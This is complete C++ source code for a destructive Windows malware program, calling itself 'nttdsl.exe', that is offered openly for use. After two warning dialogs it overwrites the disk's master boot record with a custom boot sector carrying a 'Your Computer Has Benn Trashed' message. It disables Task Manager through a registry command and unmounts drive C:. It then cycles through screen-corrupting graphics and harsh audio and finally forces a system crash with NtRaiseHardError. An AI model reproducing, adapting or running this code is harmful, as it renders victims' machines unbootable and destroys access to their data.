#include <windows.h>
#include <ctime>
#include <cmath> 
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
const unsigned char MasterBootRecord[] = {
	0xE8, 0x00, 0x00, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x89, 0xC8, 0x8E, 0xD8,
	0xBE, 0x28, 0x7C, 0x8A, 0x04, 0xB4, 0x0E, 0xB7, 0x00, 0xB3, 0x20, 0xFE,
	0xC3, 0x80, 0xFB, 0x37, 0x74, 0xF7, 0xCD, 0x10, 0x46, 0x8A, 0x04, 0x3C,
	0x00, 0x75, 0xF0, 0xC3, 0x20, 0x20, 0x28, 0x20, 0x20, 0x29, 0x5F, 0x28,
	0x20, 0x20, 0x29, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x28, 0x20,
	0x58, 0x2E, 0x58, 0x20, 0x29, 0x0D, 0x0A, 0x20, 0x5F, 0x5F, 0x5C, 0x20,
	0x20, 0x7E, 0x20, 0x20, 0x2F, 0x5F, 0x5F, 0x0D, 0x0A, 0x28, 0x5F, 0x5F,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x29, 0x0D, 0x0A,
	0x20, 0x20, 0x20, 0x28, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x29, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x28, 0x5F, 0x5F, 0x29, 0x20, 0x28, 0x5F, 0x5F,
	0x29, 0x0D, 0x0A, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x43, 0x6F, 0x6D, 0x70,
	0x75, 0x74, 0x65, 0x72, 0x20, 0x48, 0x61, 0x73, 0x20, 0x42, 0x65, 0x6E,
	0x6E, 0x20, 0x54, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64, 0x20, 0x42, 0x79,
	0x20, 0x6E, 0x74, 0x74, 0x64, 0x73, 0x6C, 0x20, 0x65, 0x6E, 0x6A, 0x6F,
	0x79, 0x20, 0x61, 0x6E, 0x74, 0x69, 0x2D, 0x73, 0x6B, 0x69, 0x64, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

void mbr(){
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
DWORD WINAPI WindowShake(LPVOID lpParam) {
	int R = 10;
	int PO = 0; 
	srand((unsigned)time(NULL));
	while (true) {
	RECT rt;
	HWND up = GetForegroundWindow(); 
	GetWindowRect(up,&rt);
	PO = rand() % 4 + 1;
	if (PO == 4)
	SetWindowPos(up,0,rt.left + R, rt.top, 100, 100, SWP_NOSIZE);
	if (PO == 3)
	SetWindowPos(up,0,rt.left - R, rt.top, 100, 100, SWP_NOSIZE);
	if (PO == 2)
	SetWindowPos(up,0,rt.left, rt.top + R, 100, 100, SWP_NOSIZE);
	if (PO == 1)
	SetWindowPos(up,0,rt.left, rt.top - R, 100, 100, SWP_NOSIZE);
	Sleep(rand() % 90 + 10);
}
}
DWORD WINAPI shader1(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 100 == 0)
                v = randy() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + i + v))[v] ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI shader2(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 110)
                v = randy() % 32;
            ((BYTE*)(data + i))[0] = ((BYTE*)(data + i + v))[0];
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI sharpen(LPVOID lpParam) {
   while (1) {
      HDC hdc = GetDC(0);
      int sw = GetSystemMetrics(0);
      int sh = GetSystemMetrics(1);
      SetStretchBltMode(hdc, 4);
      StretchBlt(hdc, 1, 1, sw + 2, sh + 2, hdc, 0, 0, sw, sh, SRCCOPY);
      StretchBlt(hdc, -1, -1, sw - 2, sh - 2, hdc, 0, 0, sw, sh, SRCCOPY);
      ReleaseDC(0, hdc);
   }
}
DWORD WINAPI mousedraw(LPVOID lpParam) {
	while(1){
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON) ;
		POINT cursor;
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_ERROR));
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {

		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI BitBlt1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		hdc = GetDC(NULL);
		BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(4);
	}
}
DWORD WINAPI InvScreenShake(LPVOID lpParam){
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		desktop = GetDC(NULL);
		BitBlt(desktop, rand() % 10,rand() % 10, xs, ys, desktop, rand() % 10,rand() %10, NOTSRCCOPY);
		ReleaseDC(0, desktop);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
 
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
 
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(10);
        }
    }
}
DWORD WINAPI swirl(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh/10, ySize = 9;
    while (1) {
    	HDC desk = GetDC(0);
        for (int i = 0; i < sh*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, i, 0, 1, sh, desk, i, wave, SRCCOPY);
        }
        for (int i = 0; i < sw*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, 0, i, sw, 1, desk, wave, i, SRCCOPY);
        }
        ReleaseDC(0, desk);
    }
}
DWORD WINAPI icons(LPVOID lpParam) {
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		HDC hDc = GetWindowDC(GetDesktopWindow());
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
		ReleaseDC(0, hDc);
	}
}
DWORD WINAPI sines(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 20;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t<<1^(t<<1)+(t>>7)&t>>12|t>>4-(1^7&t>>19)|t>>7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*((t/2>>10|t%16*t>>8)&8*t>>12&18)|-(t/16)+64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(43*(4*t>>43|4*t>>4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>6^t&t>>9^t>>12|(t<<(t>>6)%4^-t&-t>>13)%128^-t>>1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>6^t&t>>9^t>>12|((t>>6|t<<1)+(t>>5|t<<3|t>>3)|t>>2|t<<1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((6*t&t>>5|127*t>>4)>>t+64&t>>5|t>>4|t>>t/64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*(0xCA66>>(t>>9&10)&15)|t>>8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main(){
		    if (MessageBoxW(NULL, L"The software you just executed is considered (no skidded) malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS (Anti-Skidded) MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"nttdsl.exe (Anti-Skiddddddddded)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"nttdsl.exe (Anti-Skiddddddddded)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else{
        		mbr();
				system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
        		HANDLE thread0 = CreateThread(0, 0, WindowShake, 0, 0, 0);
				system("start taskmgr.exe");
				Sleep(5000);
				HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
				sound1();
				Sleep(30000);
				TerminateThread(thread1, 0);
				CloseHandle(thread1);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				system("start calc.exe");
				HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
				sound2();
				Sleep(30000);
				TerminateThread(thread2, 0);
				CloseHandle(thread2);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread3 = CreateThread(0, 0, sharpen, 0, 0, 0);
				HANDLE thread3dot1 = CreateThread(0, 0, mousedraw, 0, 0, 0);
				sound3();
				//system("mountvol a: /d");
				//system("mountvol b: /d");
				system("mountvol c: /d");
				//system("mountvol d: /d");
				//system("mountvol e: /d");
				Sleep(30000);
				TerminateThread(thread3, 0);
				CloseHandle(thread3);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
    			InvalidateRect(0, 0, 0);
				HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
				sound4();
				Sleep(30000);
				TerminateThread(thread4, 0);
				CloseHandle(thread4);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread5 = CreateThread(0, 0, BitBlt1, 0, 0, 0);
				sound5();
				Sleep(30000);
				TerminateThread(thread5, 0);
				CloseHandle(thread5);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread6 = CreateThread(0, 0, InvScreenShake, 0, 0, 0);
				HANDLE thread7 = CreateThread(0, 0, wef, 0, 0, 0);
				sound6();
				Sleep(30000);
				TerminateThread(thread6, 0);
				CloseHandle(thread6);
    			InvalidateRect(0, 0, 0);
				TerminateThread(thread7, 0);
				CloseHandle(thread7);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread8 = CreateThread(0, 0, swirl, 0, 0, 0);
				HANDLE thread9 = CreateThread(0, 0, icons, 0, 0, 0);
				sound7();
				Sleep(15000);
				TerminateThread(thread8, 0);
				CloseHandle(thread8);
    			InvalidateRect(0, 0, 0);
				TerminateThread(thread9, 0);
				CloseHandle(thread9);
    			InvalidateRect(0, 0, 0);
				HANDLE thread10 = CreateThread(0, 0, sines, 0, 0, 0);
				Sleep(15000);
				BOOLEAN b;
				unsigned long response;
				RtlAdjustPrivilege(19, true, false, &b);
				NtRaiseHardError(0xC000023C, 0, 0, 0, 6, &response);	
		}
	}
}
